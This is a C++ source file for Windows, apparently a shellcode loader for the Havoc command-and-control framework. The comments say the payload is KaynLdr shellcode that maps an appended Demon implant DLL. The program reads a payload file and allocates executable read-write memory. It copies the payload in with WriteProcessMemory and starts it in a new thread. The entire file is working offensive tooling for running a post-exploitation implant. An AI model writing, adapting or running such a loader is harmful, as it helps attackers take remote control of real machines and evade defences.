#define _CRT_SECURE_NO_WARNINGS

#include <cstdio>
#include <cstdlib>
#include <cstdint>
#include <cerrno>

#define WIN32_LEAN_AND_MEAN
#include <windows.h>

/*
 * Loader for Havoc KaynLdr raw shellcode (headerless PIC).
 * The stub runs at offset 0, finds the appended Demon DLL via a forward
 * MZ scan from RIP, maps it, and calls DllMain. It needs a 64-bit host.
 */
int main(int argc, char** argv)
{
    if (argc != 2) {
        std::printf("Usage: shellcodeLoader <payload.bin>\n");
        return 1;
    }

    // HARD REQUIREMENT: 64-bit loader for 64-bit shellcode
#if !defined(_M_X64) && !defined(_M_AMD64)
    std::fprintf(stderr, "ERROR: build this loader as x64. 32-bit cannot run x64 PIC.\n");
    return 1;
#endif

    std::printf("bow anko");

    FILE* fd = std::fopen(argv[1], "rb");
    if (!fd) { std::fprintf(stderr, "fopen failed (%d)\n", errno); return 1; }

    std::fseek(fd, 0, SEEK_END);
    const long length = std::ftell(fd);
    std::rewind(fd);
    if (length <= 0) { std::fprintf(stderr, "empty file\n"); std::fclose(fd); return 1; }

    auto* sc = static_cast<unsigned char*>(std::malloc(static_cast<size_t>(length)));
    if (!sc) { std::fclose(fd); return 1; }
    if (std::fread(sc, 1, static_cast<size_t>(length), fd) != static_cast<size_t>(length)) {
        std::fprintf(stderr, "short read\n"); std::fclose(fd); std::free(sc); return 1;
    }
    std::fclose(fd);

    if (sc[0] != 0x56) {
        std::fprintf(stderr, "warn: first byte 0x%02x, expected 0x56 (push rsi)\n", sc[0]);
    }

    void* base = VirtualAlloc(nullptr, static_cast<SIZE_T>(length),
                              MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!base) { std::fprintf(stderr, "VirtualAlloc failed (%lu)\n", GetLastError()); std::free(sc); return 1; }

    // WriteProcessMemory instead of memcpy (writes into our own process)
    SIZE_T written = 0;
    if (!WriteProcessMemory(GetCurrentProcess(), base, sc, static_cast<SIZE_T>(length), &written)) {
        std::fprintf(stderr, "WriteProcessMemory failed (%lu)\n", GetLastError());
        std::free(sc);
        return 1;
    }
    if (written != static_cast<SIZE_T>(length)) {
        std::fprintf(stderr, "short write: %zu of %ld bytes\n", written, length);
        std::free(sc);
        return 1;
    }
    std::free(sc);

    std::printf("[*] %ld bytes @ %p -- starting thread at offset 0\n", length, base);

    // NOTE: cast directly to LPTHREAD_START_ROUTINE, NOT through (void*)
    auto ep = reinterpret_cast<LPTHREAD_START_ROUTINE>(reinterpret_cast<uintptr_t>(base));
    HANDLE h = CreateThread(nullptr, 0, ep, nullptr, 0, nullptr);
    if (!h) { std::fprintf(stderr, "CreateThread failed (%lu)\n", GetLastError()); return 1; }

    WaitForSingleObject(h, INFINITE);
    return 0;
}
